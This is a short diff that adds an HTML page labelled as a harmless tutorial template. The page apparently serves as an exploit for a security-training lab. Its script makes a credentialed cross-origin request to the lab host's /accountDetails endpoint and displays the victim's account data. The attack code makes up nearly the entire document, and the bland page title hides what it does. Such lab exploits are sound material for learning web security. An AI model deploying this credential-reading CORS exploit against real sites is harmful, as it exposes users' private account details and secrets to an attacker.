@@ -1,1 +1,25 @@
-Hello world
+
+<!doctype html>
+<html>
+<head>
+<title>Our Funky HTML Page</title>
+<meta name="description" content="Our first page">
+<meta name="keywords" content="html tutorial template">
+</head>
+<body>
+    <div>
+        <p id="data"></p>
+    </div>>
+</body>
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0aa0008104d788d9c16717ce001400c5.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        document.getElementById('data').innerHTML = this.responseText;
+    };
+</script>
+</html>
